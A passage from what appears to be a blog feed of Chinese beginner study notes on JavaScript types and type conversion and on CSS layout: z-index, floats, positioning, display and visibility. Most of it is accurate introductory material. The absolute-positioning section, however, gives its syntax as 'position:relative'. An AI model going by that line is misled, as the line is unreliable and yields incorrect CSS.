title="2.4Null(空值)和Undefined(未定义的值)"></a>2.4Null(空值)和Undefined(未定义的值)</h3><p>①null(空值)类型的值只有一个，就是null<br>null这个值是用来表示一个空的对象<br>使用typeof检查一个null值时，返回一个object</p><p>②Undefined(未定义)类型的值只有一个，就是Undefined<br>当声明一个变量，但不给变量赋值时，它的值就是undefined<br>使用typeof检查一个undefined值时，会返回undefined</p><p><img src="/js/js14.png"></p><h2 id="3-强制类型转换"><a href="#3-强制类型转换" class="headerlink" title="3.强制类型转换"></a>3.强制类型转换</h2><p>1.强制类型转换指将一个数据类型强制转换为其他数据类型<br>类型转换主要指将其他数据类型转换为String、Number、Boolean。</p><h3 id="3-1将其他数据类型转换为String类型"><a href="#3-1将其他数据类型转换为String类型" class="headerlink" title="3.1将其他数据类型转换为String类型"></a>3.1将其他数据类型转换为String类型</h3><p>①方法一：<br>调用被转换类型的tostring()方法<br>该方法不会影响到原变量，它会将转换的结果返回<br>但是注意null和undefined这两个值没有tostring（）方法<br>如果调用它们（null和undefined）的方法会报错。<br><img src="/js/js15.png"></p><p>②方法二:<br>调用String（）函数，并将被转换的数据作为参数传递给函数<br>使用String()函数强制类型转换时，对于number和boolean实际上就是调用tostring()方法。<br>但是对于null和undefined，就不会调用tostring（）方法，<br>它会将null（字面量）直接转换为”null”(字符串null)<br>将undefined（字面量）直接转换为”undefined”(字符串undefined)<br><img src="/js/js16.png"></p><h3 id="3-2将其他数据类型转换为Number"><a href="#3-2将其他数据类型转换为Number" class="headerlink" title="3.2将其他数据类型转换为Number"></a>3.2将其他数据类型转换为Number</h3><p>①转换方式一:<br>使用Number()函数<br>一.字符串转换为数字时<br>1.如果是纯数字的字符串，则直接将其转换为数字。<br>2.如果是字符串中有非数字的内容，则转换为NaN(非数字值的特殊值，表示不是一个数字)。<br>3.如果字符串是一个空串或者是一个全是空格的字符串，则转换为0。<br><img src="/js/js17.png"></p><p>②布尔值转数字<br>true 转成1  false 转成0<br><img src="/js/js18.png"></p><p>③空值和未定义的值转数字<br>null转成0 undefined 转成NaN（表示不是数字）<br><img src="/js/js19.png"></p><p>④转换方式二:<br>这种方式专门用来对付字符串<br>1.parseInt() 把一个字符串转换为一个整数（从左往右读取）<br><img src="/js/js20.png"></p><p>2.parseFloat() 把一个字符串转换为一个浮点数<br><img src="/js/js21.png"></p><h3 id="3-3将其他数据类型转换为Boolean"><a href="#3-3将其他数据类型转换为Boolean" class="headerlink" title="3.3将其他数据类型转换为Boolean"></a>3.3将其他数据类型转换为Boolean</h3><p>①方式一:<br>1.数字转换为布尔值,除了0和NaN(false),其他都为true<br>2.字符串转换为布尔值，除了空串(false)，其他都为true<br>3.null和undefined转换为布尔值都为false<br>4.对象(object)转换为布尔值，为true<br><img src="/js/js23.png"></p><p>②方式二（隐式类型转换）：<br>为任意的数据类型做两次非运算(!!)，即可将其转换为布尔值<br>例子：<br>var a=”hello”;<br>a=!!a; //true </p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十一篇博客</title>
      <link href="/2021/03/19/di-er-shi-yi-pian-bo-ke/"/>
      <url>/2021/03/19/di-er-shi-yi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第二天"><a href="#学习JavaScript的第二天" class="headerlink" title="学习JavaScript的第二天"></a>学习JavaScript的第二天</h1><a id="more"></a><h2 id="1-JS编写位置"><a href="#1-JS编写位置" class="headerlink" title="1.JS编写位置"></a>1.JS编写位置</h2><p><img src="/js/js5.png"></p><h2 id="2-JS基本语法"><a href="#2-JS基本语法" class="headerlink" title="2.JS基本语法"></a>2.JS基本语法</h2><p>①.JS中严格区分大小写</p><p>②.JS中每一条语句以分号(;)结尾。如果不写分号，浏览器会自动添加，但会消耗一些系统资源，而且有些时候浏览器会加错分号。（开发中分号必须写）</p><p>③JS中会忽略多个空格和换行，所以我们可以利用空格和换行对代码进行格式化。</p><p>④.“//”表示单行注释</p><p>⑤.“/* */”表示多行注释<br>注释中的内容不可以执行，但是可以在源代码中查看，要养成良好的编写注释的习惯，也可以通过注释来对代码进行简单的调试</p><h2 id="3-字面量和变量"><a href="#3-字面量和变量" class="headerlink" title="3.字面量和变量"></a>3.字面量和变量</h2><h2 id="3-1字面量"><a href="#3-1字面量" class="headerlink" title="3.1字面量"></a>3.1字面量</h2><p>字面量：都是一些不可变的值。比如：1、2、3…<br>字面量可以直接使用，但是一般都不会直接使用字面量，因为字面量用起来比较麻烦</p><h2 id="3-2变量"><a href="#3-2变量" class="headerlink" title="3.2变量"></a>3.2变量</h2><p>变量：一般用来保存字面量，而且变量的值是可以任意改变的，变量更加方便使用，在开发中一般通过变量去保存一个字面量，而很少直接使用字面量。<br>可以通过变量对字面量进行描述（var age=60 ,age为年龄）</p><h2 id="3-3声明变量"><a href="#3-3声明变量" class="headerlink" title="3.3声明变量"></a>3.3声明变量</h2><p>在js中使用var关键字来声明变量(声明一次就行，不用重复声明)<br>第一种（声明和赋值分两步进行）<br><img src="/js/js3.png"></p><p>第二种（声明和赋值同时进行）<br><img src="/js/js4.png"></p><h2 id="4-标识符"><a href="#4-标识符" class="headerlink" title="4.标识符"></a>4.标识符</h2><h3 id="4-1-在JS中所有可以由我们自主命名的都可以称为标识符。"><a href="#4-1-在JS中所有可以由我们自主命名的都可以称为标识符。" class="headerlink" title="4.1.在JS中所有可以由我们自主命名的都可以称为标识符。"></a>4.1.在JS中所有可以由我们自主命名的都可以称为标识符。</h3><p>例如:属性名、函数名、变量名都属于标识符。</p><h3 id="4-2-命名标识符需要遵守的规则"><a href="#4-2-命名标识符需要遵守的规则" class="headerlink" title="4.2.命名标识符需要遵守的规则"></a>4.2.命名标识符需要遵守的规则</h3><p>1.标识符中可以含有数字、字母、下划线(_)、符号($)。<br>2.标识符不可以数字开头。<br>3.标识符不能是ES中的关键字或保留字。<br>4.标识符一般用驼峰命名法。<br>驼峰命名法:首字母小写,每个单词的开头字母大写，其余字母小写（helloWorld、xxxYyyZzz）</p><h3 id="4-3补充"><a href="#4-3补充" class="headerlink" title="4.3补充"></a>4.3补充</h3><p>JS底层保存标识符时,实际上是采用的Unicode编码(utf-8),所以理论上讲，所有utf-8的内容都可以作为标识符。</p><h2 id="5-进制"><a href="#5-进制" class="headerlink" title="5.进制"></a>5.进制</h2><p>在JS中，0x代表16进制，0代表8进制，0b代表2进制<br><img src="/js/js22.png"></p><h2 id="6-Unicode编码"><a href="#6-Unicode编码" class="headerlink" title="6.Unicode编码"></a>6.Unicode编码</h2><p>1.在字符串中使用转义字符输入Unicode编码,\u四位编码(16进制)</p><p>2.在网页中使用Unicode编码<br>&amp;#编码;(这里的编码用的是10进制)</p><p><img src="/js/js41.png"><br><img src="/js/js42.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十篇博客</title>
      <link href="/2021/01/17/di-er-shi-pian-bo-ke/"/>
      <url>/2021/01/17/di-er-shi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第一天"><a href="#学习JavaScript的第一天" class="headerlink" title="学习JavaScript的第一天"></a>学习JavaScript的第一天</h1><a id="more"></a><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1. 起源"></a>1. 起源</h2><p>JavaScript诞生于1995年，它的出现主要是用于处理网页中的前端验证。所谓的前端验证就是指检查用户输入的内容是否符合一定的规则。(用户名长度、邮箱格式等)</p><h2 id="2-简史"><a href="#2-简史" class="headerlink" title="2. 简史"></a>2. 简史</h2><p>1.JavaScript由网景公司发明，起初命名为liveScript，后来由于sun公司（出Java的公司）的加入更名为了JavaScript。</p><p>2.1996年微软公司发布了和JavaScript兼容的JScript，在IE3浏览器中推出了JScript(1996年)。</p><p>3.为了确保不同的浏览器上运行JavaScript标准一致，所以定制了JS的标准命名为ECMAScript（简称为ES)。ECMAScript是JavaScript的标准。</p><p>4.ES是标准，JS是实现。<br><img src="/js/js1.png"></p><h2 id="3-构成"><a href="#3-构成" class="headerlink" title="3. 构成"></a>3. 构成</h2><p>一个完整的JavaScript实现应该由三个部分构成:ECMAScript、DOM、BOM。</p><p>1.ECAMScript:JavaScript的标准。</p><p>2.DOM:文档对象模型，为我们提供一组对象，让我们可以去操纵网页。(如何通过js去操作网页)</p><p>3.BOM:浏览器对象模型，为我们提供一组对象，操纵浏览器。（如何通过js操作浏览器）。</p><h2 id="4-特征-JS是动态语言"><a href="#4-特征-JS是动态语言" class="headerlink" title="4. 特征(JS是动态语言)"></a>4. 特征(JS是动态语言)</h2><p>1.单线程:一个程序中只可以执行一个任务。</p><p>2.解释型:不用编译，写完可以直接运行。</p><p>3.弱类型:数据类型可以被忽略的语言。它与强类型定义语言相反, 一个变量可以赋不同数据类型的值。</p><p>4.跨平台:JavaScript依赖于浏览器本身，与操作环境无关。只要能运行浏览器的计算机，并支持JavaScript的浏览器就可以正确执行。</p><p>5.基于原型的面向对象:javascripth是一种基于对象的语言，能运用自己已经创建了的对象，许多功能可以来自于脚本环境中对象的方法与脚本的相互作用。</p><h2 id="5-JS的输出语法"><a href="#5-JS的输出语法" class="headerlink" title="5.JS的输出语法"></a>5.JS的输出语法</h2><p>JS语言是按照从上到下的顺序一行一行执行的<br><img src="/js/js2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十九篇博客</title>
      <link href="/2021/01/12/di-shi-jiu-pian-bo-ke/"/>
      <url>/2021/01/12/di-shi-jiu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-导航条"><a href="#CSS-导航条" class="headerlink" title="CSS 导航条"></a>CSS 导航条</h1><a id="more"></a><h2 id="1-导航栏"><a href="#1-导航栏" class="headerlink" title="1. 导航栏"></a>1. 导航栏</h2><p><img src="/css/dh1.png"></p><p>拥有易用的导航条对于任何网站都很重要。</p><p>通过 CSS，您能够把乏味的 HTML 菜单转换为漂亮的导航栏。</p><h2 id="2-导航栏-链接列表"><a href="#2-导航栏-链接列表" class="headerlink" title="2. 导航栏=链接列表"></a>2. 导航栏=链接列表</h2><p>导航栏需要标准的 HTML 作为基础。</p><p>在我们的例子中，将用标准的 HTML 列表来构建导航栏。</p><p>导航栏基本上是一个链接列表，因此使用&lt; ul&gt;和&lt; li&gt; 元素是非常合适的。</p><h2 id="3-垂直导航栏"><a href="#3-垂直导航栏" class="headerlink" title="3. 垂直导航栏"></a>3. 垂直导航栏</h2><p><img src="/css/dh2.png"></p><h2 id="4-水平导航栏"><a href="#4-水平导航栏" class="headerlink" title="4. 水平导航栏"></a>4. 水平导航栏</h2><p>有两种创建水平导航栏的方法。使用行内或浮动列表项。</p><p>两种方法都不错，但是如果希望链接拥有相同的尺寸，就必须使用浮动方法。</p><p><img src="/css/dh5.png"></p><h3 id="4-1-行内列表项"><a href="#4-1-行内列表项" class="headerlink" title="4.1 行内列表项"></a>4.1 行内列表项</h3><p><img src="/css/dh3.png"></p><h3 id="4-2-对列表进行浮动"><a href="#4-2-对列表进行浮动" class="headerlink" title="4.2 对列表进行浮动"></a>4.2 对列表进行浮动</h3><p><img src="/css/dh4.png"></p><h2 id="5-二级菜单"><a href="#5-二级菜单" class="headerlink" title="5. 二级菜单"></a>5. 二级菜单</h2><p><img src="/css/dh6.png"></p><h2 id="6-zoom-设置或检索对象的缩放比例"><a href="#6-zoom-设置或检索对象的缩放比例" class="headerlink" title="6. zoom(设置或检索对象的缩放比例)"></a>6. zoom(设置或检索对象的缩放比例)</h2><h3 id="6-1-语法"><a href="#6-1-语法" class="headerlink" title="6.1 语法"></a>6.1 语法</h3><p>zoom：normal | number |  percentage</p><p>默认值：normal</p><p>normal：使用对象的实际尺寸。</p><p>number：用浮点数来定义缩放比例。不允许负值</p><p>percentage：用百分比来定义缩放比例。不允许负值</p><h3 id="6-2-例子"><a href="#6-2-例子" class="headerlink" title="6.2 例子"></a>6.2 例子</h3><p><img src="/css/dh7.png"><br>运行结果:<br><img src="/css/dh8.png"></p><h2 id="7-css精灵图"><a href="#7-css精灵图" class="headerlink" title="7. css精灵图"></a>7. css精灵图</h2><h3 id="7-1-定义"><a href="#7-1-定义" class="headerlink" title="7.1 定义"></a>7.1 定义</h3><p>css精灵(CSS sprites),是一种网页图片应用处理技术。主要是指将网页中需要的零星的小图片集成到一个大的图片中。</p><p>其实说白了就是将精灵图设为一个大背景，然后通过background-position来移动背景图，从而显示出我们想要显示出来的部分。</p><p><img src="/css/dh9.png"></p><h3 id="7-2-必要的两个属性"><a href="#7-2-必要的两个属性" class="headerlink" title="7.2 必要的两个属性"></a>7.2 必要的两个属性</h3><p>background-image: url(“图片地址”);</p><p>background-position: x坐标 y坐标;</p><h3 id="7-3-例子"><a href="#7-3-例子" class="headerlink" title="7.3 例子"></a>7.3 例子</h3><p><img src="/css/dh10.png"><br>运行结果:<br><img src="/css/dh11.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十八篇博客</title>
      <link href="/2021/01/12/di-shi-ba-pian-bo-ke/"/>
      <url>/2021/01/12/di-shi-ba-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-z-index详解"><a href="#CSS-z-index详解" class="headerlink" title="CSS z-index详解"></a>CSS z-index详解</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h2><p>一个元素在文档中的层叠顺序，用于确认元素在当前层叠上下文中的层叠级别。</p><h2 id="2-语法"><a href="#2-语法" class="headerlink" title="2. 语法"></a>2. 语法</h2><p>z-index ：auto|&lt; integer&gt;|number<br><img src="/css/z1.png"></p><p>该属性设置一个定位元素沿 z 轴的位置，z 轴定义为垂直延伸到显示区的轴。如果为正数，则离用户更近，为负数则表示离用户更远。</p><h2 id="3-适用于"><a href="#3-适用于" class="headerlink" title="3. 适用于"></a>3. 适用于</h2><p>适用于：定位元素。即定义了position为非static的元素</p><h2 id="4-层级关系的比较"><a href="#4-层级关系的比较" class="headerlink" title="4. 层级关系的比较"></a>4. 层级关系的比较</h2><p>1.对于同级元素，默认(或position:static)情况下文档流后面的元素会覆盖前面的。</p><p>2.对于同级元素，position不为static且z-index存在的情况下z-index大的元素会覆盖z-index小的元素，即z-index越大优先级越高。</p><p>3.IE6/7下position不为static，且z-index不存在时z-index为0，除此之外的浏览器z-index为auto。</p><p>4.z-index为auto的元素不参与层级关系的比较，由向上遍历至此且z-index不为auto的元素来参与比较。</p><h2 id="5-规则"><a href="#5-规则" class="headerlink" title="5. 规则"></a>5. 规则</h2><h3 id="5-1-顺序规则"><a href="#5-1-顺序规则" class="headerlink" title="5.1 顺序规则"></a>5.1 顺序规则</h3><p><img src="/css/z2.png"></p><h3 id="5-2-定位规则"><a href="#5-2-定位规则" class="headerlink" title="5.2 定位规则"></a>5.2 定位规则</h3><p>1.如果将 position 设为 static，位于文档流后面的节点依然会遮盖前面的节点浮动,，所以 position:static 不会影响节点的遮盖关系。</p><p><img src="/css/z3.png"></p><p>2.如果将 position 设为 relative (相对定位)，absolute (绝对定位) 或者 fixed (固定定位)，这样的节点会覆盖没有设置 position 属性或者属性值为 static 的节点，说明前者比后者的默认层级高。</p><p><img src="/css/z4.png"></p><p>3.在没有 z-index 属性干扰的情况下, 根据这顺序规则和定位规则, 我们可以做出更加复杂的结构. 这里我们对 A 和 B 都不设定 position, 但对 A 的子节点 A-1 设定 position:relative. 根据顺序规则, B 会覆盖 A, 又根据定位规则 A’ 会覆盖 B.</p><p><img src="/css/z5.png"></p><h3 id="5-3-参与规则"><a href="#5-3-参与规则" class="headerlink" title="5.3 参与规则"></a>5.3 参与规则</h3><p><img src="/css/z6.png"></p><h3 id="5-4-默认值规则"><a href="#5-4-默认值规则" class="headerlink" title="5.4 默认值规则"></a>5.4 默认值规则</h3><p><img src="/css/z8.png"></p><h3 id="5-5-从父规则"><a href="#5-5-从父规则" class="headerlink" title="5.5 从父规则"></a>5.5 从父规则</h3><p><img src="/css/z9.png"></p><h2 id="6-层叠决定"><a href="#6-层叠决定" class="headerlink" title="6. 层叠决定"></a>6. 层叠决定</h2><p>每个元素层叠顺序由所属的层叠上下文和元素本身的层叠级别决定。</p><h3 id="6-1-同一层叠上下文"><a href="#6-1-同一层叠上下文" class="headerlink" title="6.1 同一层叠上下文"></a>6.1 同一层叠上下文</h3><p>1.层叠级别大的显示在上面，级别小的显示在下面；</p><p>2.层叠级别中的两个元素，依据它们在HTML文档流中的顺序，写在后面的将会覆盖前面的。</p><p><img src="/css/z10.png"><br><img src="/css/z11.png"><br><img src="/css/z12.png"></p><h3 id="6-2-不同层叠上下文"><a href="#6-2-不同层叠上下文" class="headerlink" title="6.2 不同层叠上下文"></a>6.2 不同层叠上下文</h3><p>1.元素的显示顺序依据祖先的层叠级别来决定，与自身的层叠级别无关。</p><p><img src="/css/z13.png"><br><img src="/css/z14.png"><br><img src="/css/z15.png"></p><h2 id="7-例子"><a href="#7-例子" class="headerlink" title="7.例子"></a>7.例子</h2><p><img src="/css/z16.png"><br><img src="/css/z17.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十七篇博客</title>
      <link href="/2021/01/11/di-shi-qi-pian-bo-ke/"/>
      <url>/2021/01/11/di-shi-qi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-定位"><a href="#CSS-定位" class="headerlink" title="CSS 定位"></a>CSS 定位</h1><a id="more"></a><h2 id="1-HTML标准文档流"><a href="#1-HTML标准文档流" class="headerlink" title="1. HTML标准文档流"></a>1. HTML标准文档流</h2><p>标准文档流：指的是元素排版布局过程中，元素会默认从左往右、从上往下的流式排列方式。前面的内容发生变化后，后面的内容位置也会随着发生变化。</p><h2 id="2-脱离文档流"><a href="#2-脱离文档流" class="headerlink" title="2. 脱离文档流"></a>2. 脱离文档流</h2><p>脱离文档流是相对正常文档流而言的。正常文档流就是我们没有用CSS样式去控制的HTML文档结构,你写的界面的顺序就是网页展示的顺序。所谓的脱离文档流就是指它所显示的位置和文档代码的顺序不一致了。</p><h2 id="3-浮动"><a href="#3-浮动" class="headerlink" title="3. 浮动"></a>3. 浮动</h2><h3 id="3-1-定义"><a href="#3-1-定义" class="headerlink" title="3.1 定义"></a>3.1 定义</h3><p>1.CSS的Float（浮动）,会使元素向左或向右移动，其周围的元素也会重新排列。</p><p>2.浮动元素会生成一个块级框，而不论它本身是何种元素。</p><p>3.如果浮动非替换元素，则要指定一个明确的宽度；否则，它们会尽可能地窄。</p><h3 id="3-2-语法"><a href="#3-2-语法" class="headerlink" title="3.2 语法"></a>3.2 语法</h3><p>float:取值;<br><img src="/css/c35.png"></p><h3 id="3-3-浮动的性质"><a href="#3-3-浮动的性质" class="headerlink" title="3.3 浮动的性质"></a>3.3 浮动的性质</h3><h4 id="性质1：浮动的元素脱标"><a href="#性质1：浮动的元素脱标" class="headerlink" title="性质1：浮动的元素脱标"></a>性质1：浮动的元素脱标</h4><p>脱标即脱离标准流<br><img src="/css/fd1.png"><br><img src="/css/fd2.png"></p><h4 id="性质2：浮动的元素互相贴靠"><a href="#性质2：浮动的元素互相贴靠" class="headerlink" title="性质2：浮动的元素互相贴靠"></a>性质2：浮动的元素互相贴靠</h4><p>给三个div均设置了float: left;属性之后，然后设置宽高。当改变浏览器窗口大小时，可以看到div的贴靠效果：<br><img src="/css/fd2.gif"></p><p>上图显示，3号如果有足够空间，那么就会靠着2号。如果没有足够的空间，那么会靠着1号大哥。<br>如果没有足够的空间靠着1号大哥，3号自己去贴左墙。</p><p>不过3号自己去贴墙的时候，注意：<br><img src="/css/fd3.gif"></p><p>上图显示，3号贴左墙的时候，并不会往1号里面挤。</p><h4 id="性质3：浮动的元素有“字围”效果"><a href="#性质3：浮动的元素有“字围”效果" class="headerlink" title="性质3：浮动的元素有“字围”效果"></a>性质3：浮动的元素有“字围”效果</h4><p>来看一张图就明白了。我们让div浮动，p不浮动。<br><img src="/css/fd3.png"></p><p>上图中，我们发现：div挡住了p，但不会挡住p中的文字，形成“字围”效果。</p><p>总结：标准流中的文字不会被浮动的盒子遮挡住。</p><h4 id="性质4：收缩"><a href="#性质4：收缩" class="headerlink" title="性质4：收缩"></a>性质4：收缩</h4><p>收缩：一个浮动的元素，如果没有设置width，那么将自动收缩为内容的宽度<br><img src="/css/fd4.png"></p><h4 id="浮动的补充"><a href="#浮动的补充" class="headerlink" title="浮动的补充"></a>浮动的补充</h4><p><img src="/css/fd5.png"><br>上图所示，将para1和para2设置为浮动，它们是div的儿子。此时para1+para2的宽度小于div的宽度。效果如上图所示。</p><p>可如果设置para1+para2的宽度大于div的宽度，我们会发现，para2掉下来了：<br><img src="/css/fd6.png"></p><h3 id="3-4-例子"><a href="#3-4-例子" class="headerlink" title="3.4 例子"></a>3.4 例子</h3><p>现在有两个div，分别设置宽高。我们知道，它们的效果如下：<br><img src="/css/fd7.png"></p><p>此时，如果给这两个div增加一个浮动属性，比如float: left;，效果如下：<br><img src="/css/fd8.png"></p><p>这就达到了浮动的效果。此时，两个元素并排了，并且两个元素都能够设置宽度、高度了。</p><h2 id="4-清除浮动"><a href="#4-清除浮动" class="headerlink" title="4. 清除浮动"></a>4. 清除浮动</h2><h3 id="4-1-定义"><a href="#4-1-定义" class="headerlink" title="4.1 定义"></a>4.1 定义</h3><p>css中，清除浮动是在定义浮动的元素之后设置的。</p><h3 id="4-2-语法"><a href="#4-2-语法" class="headerlink" title="4.2 语法"></a>4.2 语法</h3><p>clear:取值;</p><h3 id="4-3-属性值"><a href="#4-3-属性值" class="headerlink" title="4.3 属性值"></a>4.3 属性值</h3><p>1.clear:left;  清除左浮动</p><p>2.clear:right; 清除右浮动</p><p>3.clear:both; 左右浮动一起清除</p><h3 id="4-4-例子"><a href="#4-4-例子" class="headerlink" title="4.4 例子"></a>4.4 例子</h3><p><img src="/css/fd9.png"><br>运行结果:<br><img src="/css/fd10.png"></p><h2 id="5-固定定位-fixed"><a href="#5-固定定位-fixed" class="headerlink" title="5. 固定定位(fixed)"></a>5. 固定定位(fixed)</h2><h3 id="5-1-定义"><a href="#5-1-定义" class="headerlink" title="5.1 定义"></a>5.1 定义</h3><p>1.当元素的position属性设置为fixed时，这个元素就被固定了，被固定元素不会随着滚动条的拖动而改变位置。</p><p>2.元素的位置相对于浏览器窗口是固定位置。</p><h3 id="5-2-语法-4个属性值不一定都要用"><a href="#5-2-语法-4个属性值不一定都要用" class="headerlink" title="5.2 语法(4个属性值不一定都要用)"></a>5.2 语法(4个属性值不一定都要用)</h3><p>position:fixed;  表示使得元素成为固定定位元素。<br>top:像素值;    顶部距离(像素值就是几px)</p><p>left:像素值;   左边距离</p><p>right:像素值;   右边距离</p><p>bottom:像素值;  底部距离</p><h3 id="5-3-例子"><a href="#5-3-例子" class="headerlink" title="5.3 例子"></a>5.3 例子</h3><p><img src="/css/dw.png"><br>运行结果:<br><img src="/css/dw1.png"></p><h2 id="6-相对定位-relative"><a href="#6-相对定位-relative" class="headerlink" title="6. 相对定位(relative)"></a>6. 相对定位(relative)</h2><h3 id="6-1-定义"><a href="#6-1-定义" class="headerlink" title="6.1 定义"></a>6.1 定义</h3><p>采用相对定位的元素，其位置是相对于它的原始位置计算而来的。在css中相对定位通过将元素从原来的位置向上、下、左、右移动来定位的。（偏移后原来位置不会补入，空着）</p><h3 id="6-2-语法"><a href="#6-2-语法" class="headerlink" title="6.2 语法"></a>6.2 语法</h3><p>position:relative;  表示使得元素成为相对定位元素。<br>top:像素值;    顶部距离</p><p>left:像素值;   左边距离</p><p>right:像素值;   右边距离</p><p>bottom:像素值;  底部距离</p><p>相对定位的容器浮上来后，其所占位置仍然留有空位，后面的无定位元素仍然不会“挤上来”。</p><h3 id="6-3-例子"><a href="#6-3-例子" class="headerlink" title="6.3 例子"></a>6.3 例子</h3><p>没有定义相对定位的效果图:<br><img src="/css/dw2.png"><br>定义相对定位后的效果图:<br><img src="/css/dw3.png"></p><h2 id="7-绝对定位-absoulte"><a href="#7-绝对定位-absoulte" class="headerlink" title="7. 绝对定位(absoulte)"></a>7. 绝对定位(absoulte)</h2><h3 id="7-1-定义"><a href="#7-1-定义" class="headerlink" title="7.1 定义"></a>7.1 定义</h3><p>1.绝对定位的元素的位置相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于&lt; html&gt;。</p><p>2.能够很精确的把元素移到任意你想要的位置。</p><h3 id="7-2-语法"><a href="#7-2-语法" class="headerlink" title="7.2 语法"></a>7.2 语法</h3><p>position:relative;  表示使得元素成为绝对定位元素。<br>top:像素值;    顶部距离</p><p>left:像素值;   左边距离</p><p>right:像素值;   右边距离</p><p>bottom:像素值;  底部距离</p><h3 id="7-3-例子"><a href="#7-3-例子" class="headerlink" title="7.3 例子"></a>7.3 例子</h3><p><img src="/css/dw4.png"><br>运行结果:<br><img src="/css/dw5.png"></p><h2 id="8-静态定位-static"><a href="#8-静态定位-static" class="headerlink" title="8. 静态定位(static)"></a>8. 静态定位(static)</h2><h3 id="8-1-定义"><a href="#8-1-定义" class="headerlink" title="8.1 定义"></a>8.1 定义</h3><p>1.HTML元素的默认值，即没有定位，遵循正常的文档流对象。</p><p>2.静态定位的元素不会受到 top, bottom, left, right影响。</p><h3 id="8-2-语法"><a href="#8-2-语法" class="headerlink" title="8.2 语法"></a>8.2 语法</h3><p>position:static;  表示使得元素成为静态定位元素。</p><p>默认情况下，元素是静态定位，static是position属性的默认值，它表示保留原来位置，不会重新定位。</p><h3 id="8-3-例子"><a href="#8-3-例子" class="headerlink" title="8.3 例子"></a>8.3 例子</h3><p><img src="/css/dw6.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十六篇博客</title>
      <link href="/2021/01/10/di-shi-liu-pian-bo-ke/"/>
      <url>/2021/01/10/di-shi-liu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-元素属性"><a href="#CSS-元素属性" class="headerlink" title="CSS 元素属性"></a>CSS 元素属性</h1><a id="more"></a><h2 id="1-display属性"><a href="#1-display属性" class="headerlink" title="1. display属性"></a>1. display属性</h2><h3 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h3><p>display属性规定元素应该生成的框的类型。</p><h3 id="1-2-语法"><a href="#1-2-语法" class="headerlink" title="1.2 语法"></a>1.2 语法</h3><p>display:属性值;</p><h3 id="1-3-块级元素特点"><a href="#1-3-块级元素特点" class="headerlink" title="1.3 块级元素特点"></a>1.3 块级元素特点</h3><p>1.总是以一个块的形式表现出来，占领一整行。若干同级块元素会从上之下依次排列（使用float属性除外）。</p><p>2.可以设置高度、宽度、各个方向外边距（margin）以及各个方向的内边距（padding）。</p><p>3.当宽度（width）没有值时，它的宽度时其容器的100%，除非我们给它设定了固定的宽度。</p><p>4.块级元素中可以容纳其他块级元素或行内元素。</p><p>5.常见的块级元素由&lt; p &gt;&lt; div &gt;&lt; h1&gt;&lt; li&gt;等等。</p><h3 id="1-4-行内元素"><a href="#1-4-行内元素" class="headerlink" title="1.4 行内元素"></a>1.4 行内元素</h3><p>1.它不会单独占据一整行，而是只占领自身的宽度和高度所在的空间。若干同级行内元素会从左到右（即某个行内元素可以和其他行内元素共处一行），从上到下依次排列。</p><p>2.行内元素不可以设置高度、宽度，其高度一般由其字体的大小来决定，其宽度由内容的长度控制。</p><p>3.行内元素只能设置左右的margin值和左右的padding值，而不能设置上下的margin值和上下的padding值。因此我们可以通过设置左右的padding值来改变行内元素的宽度。</p><p>4.常见的行内元素由&lt; a&gt;&lt; em&gt;&lt; img&gt;等等。</p><p>5.行内元素一般不可以包含块级元素。</p><h3 id="1-3-常用属性值"><a href="#1-3-常用属性值" class="headerlink" title="1.3 常用属性值"></a>1.3 常用属性值</h3><p>1.属性值none(display:none;)</p><p>none这个值表示此元素将不被显示。</p><p>2.属性值inline(display:inline;)<br>display:inline的作用可以将一个块级元素转换成行内元素，那么这个块级元素将不能再设置宽和高以及上下方向的margin和padding。</p><p><img src="/css/c24.png"><br>运行结果:<br><img src="/css/c24yx.png"></p><p>3.属性值block(display:block)<br>通过对一个行内元素设置display:block;可以将行内元素设置为块级元素，进而设置它的宽高和上下左右的padding和margin。　</p><p><img src="/css/c25.png"><br>运行结果:<br><img src="/css/c25yx.png"></p><p>4.属性值inline-block(display:inline-block)<br>inline-block属性的元素既具有block元素可以设置width和height属性的特性，又保持了inline元素不换行的特性。</p><p><img src="/css/c26.png"><br>运行结果:<br><img src="/css/c26yx.png"></p><h2 id="2-visibility属性"><a href="#2-visibility属性" class="headerlink" title="2. visibility属性"></a>2. visibility属性</h2><h3 id="2-1-定义"><a href="#2-1-定义" class="headerlink" title="2.1 定义"></a>2.1 定义</h3><p>visibility 属性规定元素是否可见。(即使不可见的元素也会占据页面上的空间)</p><h3 id="2-2-语法"><a href="#2-2-语法" class="headerlink" title="2.2 语法"></a>2.2 语法</h3><p>visibility:属性值;</p><p><img src="/css/c27.png"></p><h3 id="2-3-例子"><a href="#2-3-例子" class="headerlink" title="2.3 例子"></a>2.3 例子</h3><p><img src="/css/c28.png"><br>运行结果:<br><img src="/css/c28yx.png"></p><h2 id="3-overflow属性"><a href="#3-overflow属性" class="headerlink" title="3. overflow属性"></a>3. overflow属性</h2><h3 id="3-1-定义"><a href="#3-1-定义" class="headerlink" title="3.1 定义"></a>3.1 定义</h3><p>overflow 属性规定当内容溢出元素框时发生的事情。</p><h3 